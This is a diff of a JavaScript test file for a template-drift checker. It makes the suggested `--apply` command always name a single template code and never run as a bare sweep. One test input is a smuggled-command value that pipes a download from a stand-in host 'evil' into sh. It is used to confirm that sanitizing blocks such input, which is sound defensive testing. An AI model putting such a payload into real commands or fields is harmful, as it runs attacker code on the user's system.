@@ -394,9 +394,12 @@ test('through the real exec path, an unknown name and a missing binary are both 
 // four times by a clause that did: one named a tool, one denied a tool, one affirmed one, and one
 // was slipped in between the parts a partial match looks at. So it is compared whole, and rewording
 // it fails here on purpose: changing it should take a decision and not a drive-by.
-const AFTER_COUNT =
+// The command names a template, the first one that is behind: `--apply` with none patches every
+// template in the registry, which is a sweep and not the one-at-a-time this asks a person for.
+const afterCount = (code) =>
   "This check only reports. If none of your tools moves a template's pin, a person runs " +
-  '`npm run check-upstreams -- --apply` in templates/ of InsForge/instacloud-oss, reads the diff ' +
+  `\`npm run check-upstreams -- --apply ${code}\` in templates/ of InsForge/instacloud-oss ` +
+  "(with each template's own code, one at a time), reads the diff " +
   'and opens the pull request. Tell them which are behind, from the lines above.';
 
 test('the lines name what moved, and end with the move that follows', () => {
@@ -419,17 +422,38 @@ test('the lines name what moved, and end with the move that follows', () => {
       'pi: up to date',
       'openclaw: could not be resolved, needs a registry token',
       '',
-      `1 behind. ${AFTER_COUNT}`,
+      `1 behind. ${afterCount('n8n')}`,
     ].join('\n'),
   );
-  // Whatever the rows are, the sentence is the same one: nothing in it depends on a level or a count.
+  // Whatever the rows are, the sentence is the same one: nothing in it depends on a level or a count,
+  // and its command is for the first that is behind, not the first row and not all of them.
   assert.equal(
     describeDrift([
       { code: 'n8n', from: '1.0.0', to: '2.0.0', level: 'major' },
       { code: 'laya', from: 'c9dcaab', to: 'd113dca', level: null },
     ]),
-    ['n8n: 1.0.0 -> 2.0.0  major', 'laya: c9dcaab -> d113dca  changed, not comparable', '', `2 behind. ${AFTER_COUNT}`].join('\n'),
+    ['n8n: 1.0.0 -> 2.0.0  major', 'laya: c9dcaab -> d113dca  changed, not comparable', '', `2 behind. ${afterCount('n8n')}`].join('\n'),
   );
+  assert.equal(
+    describeDrift([{ code: 'pi', current: true }, { code: 'laya', from: 'c9dcaab', to: 'd113dca', level: null }]).split('\n').at(-1),
+    `1 behind. ${afterCount('laya')}`,
+  );
+  // Never the bare flag: with no code it patches every template in the registry.
+  for (const rows of [[{ code: 'n8n', from: '1', to: '2' }], [{ code: 'claude-code', from: '1', to: '2' }, { code: 'pi', from: '1', to: '2' }]]) {
+    const said = describeDrift(rows);
+    assert.doesNotMatch(said, /--apply(?![ ]\S)/, 'the command always has a code after it');
+    assert.match(said, new RegExp(`--apply ${rows[0].code}\``), 'and it is the first one that is behind');
+  }
+  // The example is a command a person is told to run, and readDrift picks rows out of noisy box
+  // output rather than checking them, so a code that is not one becomes the placeholder.
+  for (const bad of ['x`; curl evil|sh`', '--apply', 'a b', 'N8N', '', null, undefined, {}, 7]) {
+    // The sentence, not the listing above it: a code in the listing is something the detector
+    // reported, and a code in the command is something a person is about to run.
+    const said = describeDrift([{ code: bad, from: '1', to: '2' }]).split('\n').at(-1);
+    assert.match(said, /--apply <code>` in templates\//, `a code that is not one: ${JSON.stringify(bad) ?? 'undefined'}`);
+    assert.doesNotMatch(said, /curl|;|\|/, 'nothing from the row reaches the command');
+  }
+  assert.match(describeDrift([{ code: 'claude-code', from: '1', to: '2' }]), /--apply claude-code`/, 'a real code is still used');
   // A commit sha has no level, and calling it a patch would be an invention.
   assert.match(
     describeDrift([{ code: 'laya', from: 'c9dcaab', to: 'd113dca', level: null }]),
